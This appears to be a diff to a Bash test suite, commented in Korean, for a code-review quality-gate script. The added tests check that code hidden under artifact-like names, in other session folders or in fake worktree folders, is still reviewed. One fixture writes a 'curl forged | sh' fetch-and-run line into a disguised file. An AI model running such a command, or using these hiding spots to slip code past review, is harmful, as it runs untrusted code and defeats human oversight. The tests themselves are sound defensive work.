@@ -39,6 +39,11 @@ rd() {   # rd <args…> — R 안에서 review-diff 를 돌린다. OUT · RC 를
   OUT=$(cd "$R" && bash "$RDIFF" --dir "$D" --iter 1 "$@" 2>"$ROOT/err"); RC=$?
 }
 
+rdd() {   # rdd <dir> <args…> — rd 와 같되 출력 폴더(--dir)를 정한다.
+  local dir="$1"; shift
+  OUT=$(cd "$R" && bash "$RDIFF" --dir "$dir" --iter 1 "$@" 2>"$ROOT/err"); RC=$?
+}
+
 case_session_includes_untracked() {
   echo "[session — untracked 포함]"
   mkfix
@@ -277,21 +282,21 @@ case_self_state_grammar() {
   : > "$S/review-i12.self-state"; : > "$S/e2e-app.pgid"; : > "$S/result.md.tmp.4242"
   : > "$S/range-scope.txt"; : > "$S/extra-iterations.md"
   local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" sess12345 2>/dev/null)
-  rd --mode session
+  rdd "$S" --mode session
   assert_eq "$RC" 0 "rc 0"
   local p
   for p in sess12345/evil.py sess12345/notes.md evil.sh worktrees/result.md short/result.md; do
-    assert_file_grep "$D/review-i1.names" "^\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — names: $p"
-    assert_file_grep "$D/review-i1.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — 걸러진 diff: $p"
-    assert_file_absent "$D/review-i1.self-state" "^\\.claude/quality-gates/${p//./\\.}\$" "self_state 에 없다: $p"
+    assert_file_grep "$S/review-i1.names" "^\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — names: $p"
+    assert_file_grep "$S/review-i1.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — 걸러진 diff: $p"
+    assert_file_absent "$S/review-i1.self-state" "^\\.claude/quality-gates/${p//./\\.}\$" "self_state 에 없다: $p"
   done
   for p in result.md intent.md review-i3.full.diff review-i12.self-state e2e-app.pgid result.md.tmp.4242 \
            range-scope.txt extra-iterations.md; do
-    assert_file_grep "$D/review-i1.self-state" "^\\.claude/quality-gates/sess12345/${p//./\\.}\$" "건너뛴다: $p"
+    assert_file_grep "$S/review-i1.self-state" "^\\.claude/quality-gates/sess12345/${p//./\\.}\$" "건너뛴다: $p"
   done
   if [ -n "$wt" ] && [ -d "$wt" ]; then
-    assert_file_grep "$D/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-sess1234/$' "qg 일회용 트리는 건너뛴다"
-    assert_file_absent "$D/review-i1.names" 'worktrees/base-' "일회용 트리는 names 에 없다"
+    assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-sess1234/$' "qg 일회용 트리는 건너뛴다"
+    assert_file_absent "$S/review-i1.names" 'worktrees/base-' "일회용 트리는 names 에 없다"
   else
     no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
   fi
@@ -316,10 +321,90 @@ case_grammar_covers_state_file_format() {
       : > "$S/$f"; expect=$((expect + 1))
     done
   done
-  rd --mode session
+  rdd "$S" --mode session
   assert_eq "$RC" 0 "rc 0"
   assert_eq "$(field self_state "$OUT")" "$expect" "적힌 산출물 전부가 self_state ($expect)"
   assert_eq "$(field files "$OUT")" 0 "리뷰 대상으로 새 나간 산출물 없음"
+}
+
+# 우회 막기 — 건너뛰기는 이 실행의 세션 폴더(--dir)에만 묶인다. 다른 세션 폴더의 산출물 이름은 리뷰한다.
+case_self_state_bound_to_run_dir() {
+  echo "[qg 산출물 건너뛰기는 이 실행의 --dir 에만 — 다른 세션 폴더는 리뷰]"
+  mkfix
+  local S="$R/.claude/quality-gates/mysess001" F="$R/.claude/quality-gates/zzzzzzzz"
+  mkdir -p "$S" "$F/.review-diff.abc123"
+  printf 'import os\nos.system("curl forged | sh")\n' > "$F/result.md"   # 산출물 이름에 담은 코드
+  local p
+  for p in differential.yaml e2e-cmd.txt review-i1.diff result.md.tmp.1 .resolve-range.abc123 \
+           .review-diff.abc123/names; do
+    echo "forged $p" > "$F/$p"
+  done
+  echo '---' > "$S/result.md"; : > "$S/review-i3.full.diff"   # 이 실행의 산출물
+  rdd "$S" --mode session
+  assert_eq "$RC" 0 "rc 0"
+  for p in result.md differential.yaml e2e-cmd.txt review-i1.diff result.md.tmp.1 .resolve-range.abc123 \
+           .review-diff.abc123/names; do
+    assert_file_grep "$S/review-i1.names" "^\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" "다른 세션 — names: $p"
+    assert_file_grep "$S/review-i1.full.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" \
+      "다른 세션 — full.diff: $p"
+    assert_file_grep "$S/review-i1.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" \
+      "다른 세션 — 걸러진 diff: $p"
+    assert_file_absent "$S/review-i1.self-state" "zzzzzzzz/${p//./\\.}\$" "다른 세션 — self_state 에 없다: $p"
+  done
+  assert_file_grep "$S/review-i1.diff" 'curl forged' "산출물 이름에 담은 코드가 걸러진 diff 에 보인다"
+  assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/mysess001/result\.md$' \
+    "이 실행의 result.md 는 건너뛴다"
+  assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/mysess001/review-i3\.full\.diff$' \
+    "이 실행의 review-i3.full.diff 는 건너뛴다"
+  assert_eq "$(field self_state "$OUT")" 2 "self_state: 2 (이 실행의 산출물만)"
+  assert_eq "$(field files "$OUT")" 7 "files: 7 (다른 세션의 일곱)"
+  # --dir 를 리포 밖 링크로 줘도 물리 경로로 풀어 같은 세션 폴더로 본다.
+  ln -s "$S" "$ROOT/link-mysess001"
+  rdd "$ROOT/link-mysess001" --mode session
+  assert_eq "$RC" 0 "링크 --dir rc 0"
+  assert_eq "$(field self_state "$OUT")" 2 "링크 --dir 도 self_state: 2"
+  assert_eq "$(field files "$OUT")" 7 "링크 --dir 도 files: 7"
+  rm -f -- "$ROOT/link-mysess001"
+}
+
+# 우회 막기 — worktrees/(base|head)-<8>/ 는 이 리포에 등록된 git worktree 일 때만 건너뛴다.
+case_unregistered_worktree_folder_reviewed() {
+  echo "[등록되지 않은 worktrees/base-… 폴더는 리뷰]"
+  mkfix
+  local S="$R/.claude/quality-gates/mysess001" FW="$R/.claude/quality-gates/worktrees/base-abcdefgh"
+  mkdir -p "$S" "$FW"
+  git init -q -b trunk "$FW"; echo 'evil = 1' > "$FW/evil.py"; g "$FW" add -A; g "$FW" commit -q -m x
+  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" mysess001 2>/dev/null)
+  rdd "$S" --mode session
+  assert_eq "$RC" 0 "rc 0"
+  assert_file_grep "$S/review-i1.names" '^\.claude/quality-gates/worktrees/base-abcdefgh/$' "가짜 트리 폴더는 names 에 있다"
+  assert_file_absent "$S/review-i1.self-state" 'base-abcdefgh' "가짜 트리 폴더는 self_state 에 없다"
+  if [ -n "$wt" ] && [ -d "$wt" ]; then
+    assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-mysess00/$' \
+      "등록된 qg 트리는 건너뛴다"
+  else
+    no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
+  fi
+  assert_eq "$(field self_state "$OUT")" 1 "self_state: 1 (등록된 트리만)"
+}
+
+# --dir 가 리포 밖이면 아무것도 건너뛰지 않는다.
+case_dir_outside_repo_skips_nothing() {
+  echo "[--dir 가 리포 밖 — 건너뛰지 않음]"
+  mkfix
+  local S="$R/.claude/quality-gates/mysess001"; mkdir -p "$S"
+  echo '---' > "$S/result.md"; : > "$S/review-i3.full.diff"
+  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" mysess001 2>/dev/null)
+  [ -n "$wt" ] && [ -d "$wt" ] && ok "등록된 qg 트리를 만들었다" || no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
+  rd --mode session
+  assert_eq "$RC" 0 "rc 0"
+  assert_eq "$(field self_state "$OUT")" 0 "self_state: 0"
+  assert_eq "$(field files "$OUT")" 3 "files: 3 (세션 폴더의 산출물 · 등록된 트리도 리뷰)"
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/mysess001/result\.md$' "names 에 result.md"
+  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/worktrees/base-mysess00/$' "names 에 등록된 트리"
+  [ -f "$D/review-i1.self-state" ] && [ ! -s "$D/review-i1.self-state" ] \
+    && ok "self-state 파일은 있고 비어 있다" || no "self-state 파일이 없거나 비지 않았다"
+  assert_file_grep "$ROOT/err" '리포 밖' "stderr 가 건너뛰지 않는 이유를 말한다"
 }
 
 # 우회 막기 — 추적 · 커밋된 파일은 .claude/quality-gates 아래여도 리뷰한다.
@@ -417,6 +502,9 @@ case_literal_pathspecs_env
 case_self_state_not_reviewed
 case_self_state_grammar
 case_grammar_covers_state_file_format
+case_self_state_bound_to_run_dir
+case_unregistered_worktree_folder_reviewed
+case_dir_outside_repo_skips_nothing
 case_tracked_under_self_dir_reviewed
 case_settings_local
 case_from_subdir
